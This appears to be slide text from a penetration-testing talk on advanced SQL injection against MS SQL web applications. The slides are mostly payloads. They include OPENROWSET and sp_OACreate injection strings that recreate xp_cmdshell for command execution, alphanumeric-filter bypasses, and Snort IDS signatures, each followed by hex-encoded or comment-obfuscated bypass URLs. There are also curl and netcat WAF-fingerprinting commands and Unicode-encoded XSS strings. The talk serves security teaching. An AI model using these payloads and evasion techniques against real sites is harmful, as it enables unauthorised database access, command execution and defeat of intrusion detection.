@OLEResult=sp_OACreate ''WScript.Shell'',@ShellID OUT IF @OLEResult<>0 SELECT 
@result=@OLEResult IF @OLEResult<>0 RAISERROR(''CreateObject %0X'',
14,1,@OLEResult) EXECUTE @OLEResult=sp_OAMethod @ShellID,''Run'',Null,''ping -n 8 
127.0.0.1'',0,1IF @OLEResult<>0 SELECT @result=@OLEResult IF @OLEResult<>0 
RAISERROR (''Run %0X'',14,1,@OLEResult) EXECUTE @OLEResult=sp_OADestroy 
@ShellID');&a=1
Remember to correctly identify the backend version as this step because MS SQL 2000 
handle this differently than MS SQL 2005
Privilege Escalation
Step 3: Recreate the xp_cmdshell stored procedure (What's really going on?) 
select * from OPENROWSET('SQLOLEDB','';'sa';'j0e','select 1;
DECLARE @result int,@OLEResult int,@RunResult int,@ShellID int 
EXECUTE @OLEResult=sp_OACreate ''WScript.Shell'',@ShellID OUT IF @OLEResult<>0 
SELECT @result=@OLEResult IF @OLEResult<>0 RAISERROR(''CreateObject%0X'',14,1,@OLEResult) 
EXECUTE @OLEResult=sp_OAMethod @ShellID,''Run'',Null,''ping -n 8 127.0.0.1'',0,1IF @OLEResult<>0 
SELECT @result=@OLEResult IF @OLEResult<>0 
RAISERROR (''Run %0X'',14,1,@OLEResult) EXECUTE @OLEResult=sp_OADestroy @ShellID');&a=1
Privilege Escalation
I know that people often think this stuff is very black and white, cut and dry - but the 
simple truth with sql injection is sometimes you just have a gut feeling that you are 
looking at a vulnerable page. 
You've tried a bunch of things but for some reason nothing seems to be working. You 
may be facing some sort of filtering. Maybe the developer has attempted to stop sql 
injection by only allowing alphanumeric characters as input.
Filter Evasion
The first thing that we want to do is determine if the filtering is client-side (ex: being 
done with javascript).
View source code and look for any parameters being passed to the website that 
may be filtered with javascript/vbscript and remove them
- Save the page locally and remove offending javascript/vbscript
or
- Use a local proxy (ex: Paros, Webscarab, Burp Suite) 
Client-Side Filtering
Server-side Alphanumeric Filter
http://[site]/page.asp?id=2 or 1 like 1
Here we are doing an “or true,” although this time we are using the “like” 
comparison instead of the “=” sign. We can use this same technique for the other 
variants such as “and 1 like 1” or “and 1 like 2”
http://[site]/page.asp?id=2 and 1 like 1
http://[site]/page.asp?id=2 and 1 like 2
Restrictive Blacklist
The key to IDS/IPS evasion is knowing that there is one in place. 
With an IPS you can use something like Active Filter Detection or you can try something 
REALLY noisy from  another IP address to see if your IP gets blocked. 
Depending of the scope of your engagement you may or may not really be able to identify 
when an IDS is in use because it's passive in nature.
I've honestly found this side of the house to be more proof-of-concept, and just having 
fun as opposed to something I've actually needed on assessments. 
Signature Based IDS
Signature 1
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection attempt”;
flow: to_server, established; content: “' or 1=1 --”; nocase; sid: 1; rev:1;) 
Bypass Techniques:
http://[site]/page.asp?id=2 or 2=2--
http://[site]/page.asp?id=2 or 1 $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection attempt”;
flow: to_server, established; pcre: “/(and|or) 1=1 (\-\-|\/\*|\#)/i”; sid: 1; rev:2;) 
Bypass Techniques:
http://[site]/page.asp?id=2 or 2=2%2D%2D
http://[site]/page.asp?id=2 or 1 $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection SELECT 
statement”; flow: to_server, established; pcre:”/select.*from.*(\-\-|\/\*|\#)/i”; sid: 2; rev: 1;) 
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection UNION
statement”; flow: to_server, established; pcre:”/union.*(\-\-|\/\*|\#)/i”; sid: 3; rev: 1;) 
Bypass Techniques:
http://[site]/page.asp?id=2 or 2 in (%73%65%6C%65%63%74%20%75%73%65%72)%2D%2D
http://[site]/page.asp?id=2 or 2 in (select user)--
http://[site]/page.asp?id=-2 %55%4E%49%4F%4E%20%41%4C%4C%20%73%65%6C%65%63%74%201,2,3,(%73%65%6C
%65%63%74%20%75%73%65%72),5,6,7%2D%2D
http://[site]/page.asp?id=-2 UNION ALL select 1,2,3,(select user),5,6,7--
....c'mon everyone name some more
Signature Negatives
- Although sigs 3-5 are much better, they don't consider the attacker may use different encoding types such as hex
Signature Based IDS (3-5) 
Signature 6
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection SELECT statement”; flow: to_server, 
established; pcre:”/(s|%73)(e|%65)(l|%6C)(e|%65)(c|%63)(t|%74).*(f|%66)(r|%72)(o|%6F)(m|%6D).*(\-\-|\/\*|\#)/i”; sid: 2; rev2;) 
Signature 7
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (msg: “SQL Injection SELECT statement”; flow: to_server, 
established; pcre:”/(s|%73|%53)(e|%65|%45)(l|%6C|%4C)(e|%65|%45)(c|%63|%43)(t|%74|%45).*(f|%66|%46)(r|%72|%52)(o|
%6F|%4F)(m|%6D|%4D).*(\-\-|\/\*|\#)/i”; sid: 2; rev: 3;) 
At least signature 7 takes into account case sensitivity with hex encoding.
But.....
There are always other encoding types that the attacker can use...
Signature Based IDS (6-7) 
Practice Your Kung Fu: PHPIDS
Practice Your Kung Fu: PHPIDS
The real trick for each of these techniques is to understand that this is just like IDS 
evasion in the service based exploitation side of the house. 
You have to make sure that your attack actually works. It's easy to bypass an IDS, but 
you can just as easily end up with your attack bypassing the IDS, but not working at all. 
With this in mind you can mix/match the IDS evasion tricks - it's just a matter of 
understanding the regex in use.
http://[site]/page.asp?id=2%20or%202%20in%20(/*IDS*/%73/*evasion*/%65/*is*/
%6C/*easy*/%65/*just*/%63/*ask*/%74/*j0e*/%20%75/*to*/%73/*teach*/%65/*you*/
%72/*how*/)%2D%2D
What is passed to the db
http://[site]/page.asp?id=2 or 2 in (select user)--
in comments ("IDS evasion is easy just ask j0e to teach you how") 
Signature Based IDS
WAFs are surprisingly easy to detect?
Generally you just have to send 1 valid request, and one malicious request and diff the response.
Malicious tends to be any HTTP request that has a payload that contains things like:
' “ < ? # 
- | ^ *
Identifying Web Application Firewalls
How can you determine if the target host has deployed a WAF?
Curl
curl -i http://targetcompany.com/cmd.exe | grep "501 Method"
Netcat
$ (echo "GET /cmd.exe HTTP/1.1"; echo "Host: targetcompany.com"; echo) | nc targetcompany.com | grep "501 Method Not Implemented"
If the server responds with error code “501 Method Not Implemented” then it is running mod_security.
Curl
curl -i http://www.targetcompany.com/%27
HTTP/1.1 999 No Hacking
Server: WWW Server/1.1
Identifying Web Application Firewalls
How can you determine if the target host has deployed a WAF?
Gary O'Leary-Steele
http://packetstormsecurity.org/web/unicode-fun.txt
[j0e@LinuxLaptop toolz]$ ruby unicode-fun.rb
Enter string to URL Unicode:
%u003c%uff53%uff43%uff52%uff49%uff50%uff54%u003e%uff41%uff4c%uff45%uff52%uff
54%uff08%u02b9%uff38%uff33%uff33%u02b9%uff09%u003c%u2215%uff53%uff43%uff52
%uff49%uff50%uff54%u003e
Curl
curl -i http://www.targetcompany.com/3c%73%63%72%69%70%74%3e%61%6c
%65%72%74%28%27%58%53%53%27%29%3c%2f%73%63%72%69%70%74%3e
HTTP/1.1 404 Not Found
Date: Sat, 14 Mar 2009 19:13:10 GMT
Server: Apache
Identifying Web Application Firewalls
How can you determine if the target host has deployed a WAF?
Curl
curl -i http://www.targetcompany.com/3c%73%63%72%69%70%74%3e%61%6c
%65%72%74%28%27%58%53%53%27%29%3c%2f%73%63%72%69%70%74%3e
HTTP/1.1 200 Condition Intercepted
Date: Sun, 15 Mar 2009 01:42:01 GMT
Server: Apache
Identifying Web Application Firewalls
DotNet Defender WAF
Bypassing DotNet Defender
DotNet Defender
Dumping Admin PW – sorry DotNet Defender
SQL Tutorials:
http://www.sql-tutorial.net/
SQL Injection Tutorials
http://www.securitydocs.com/library/3587
http://www.astalavista.com/index.php?section=docsys&cmd=details&id=42
SQL Injection Cheatsheets:
http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/
http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/
Basic References
Lots, and lots, and lots of late nights with rum and coke at my side...
Paul Battista's ToorCon 9 Presentation
http://www.securityexperiment.com/se/documents/Overlooked%20SQL%20Injection%2020071021.pdf
Brad Warneck's GCIA Paper
http://www.giac.org/certified_professionals/practicals/gcia/1231.php
References For This Presentation
You want the presentation????? Buy me a rum and coke tonight....
You can contact me at:
Email:
PI:EMAIL
Twitter:
http://twitter.com/j0emccray
LinkedIn:
http://www.linkedin.com/in/joemccray
Download This Presentation